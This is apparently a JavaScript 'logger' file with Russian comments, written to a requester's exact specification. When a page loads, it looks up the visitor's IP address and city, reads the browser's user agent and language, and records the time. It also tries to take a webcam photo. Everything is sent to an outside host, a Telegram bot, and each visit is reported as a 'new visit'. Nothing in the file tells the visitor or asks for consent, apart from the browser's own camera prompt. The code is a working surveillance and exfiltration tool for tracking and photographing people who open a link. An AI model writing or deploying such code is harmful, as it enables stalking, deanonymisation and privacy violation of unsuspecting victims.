// logger.js — ТОЧНАЯ СТРУКТУРА КАК ТЫ ПРОСИЛ
(async function() {
    "use strict";

    // ========== 1. Сбор IP и геолокации ==========
    let ipAddress = "0.0.0.0";
    let country = "не определена";
    let region = "не определён";
    let city = "не определён";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        country = geoData.country_name || "не определена";
        region = geoData.region || "не определён";
        city = geoData.city || "не определён";
    } catch(e) {
        console.warn("Geo error:", e);
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent ПОЛНЫЙ ==========
    const fullUserAgent = navigator.userAgent;
    const language = navigator.language || "не определён";

    // ========== 4. Формирование сообщения (ТОЧНАЯ СТРУКТУРА) ==========
    const message = `🚨 <b>Новый переход!</b>

<b>🌐 IP:</b> <code>${ipAddress}</code>
<b>├─ User-Agent:</b> <code>${fullUserAgent}</code>
<b>├─ Язык:</b> <code>${language}</code>
<b>└─ Время:</b> <code>${timeStr}</code>

<b>🌍 Геолокация:</b>
<b>├─ Страна:</b> <code>${country}</code>
<b>├─ Регион:</b> <code>${region}</code>
<b>└─ Город:</b> <code>${city}</code>`;

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка в Telegram ==========
    async function sendPhotoWithCaption(blob, captionText) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", blob, "webcam_snapshot.jpg");
        formData.append("caption", captionText);
        formData.append("parse_mode", "HTML");

        const response = await fetch(url, { method: "POST", body: formData });
        return response.json();
    }

    async function sendTextOnly(text) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: "HTML",
                disable_web_page_preview: true
            })
        });
        return response.json();
    }

    // Отправляем
    if (photoBlob) {
        const result = await sendPhotoWithCaption(photoBlob, message);
        if (result.ok) {
            console.log("✅ Фото и данные отправлены");
        } else {
            console.log("❌ Ошибка отправки фото, отправляем текст");
            await sendTextOnly(message);
        }
    } else {
        await sendTextOnly(message);
        console.log("✅ Текст отправлен (камера недоступна)");
    }
})();
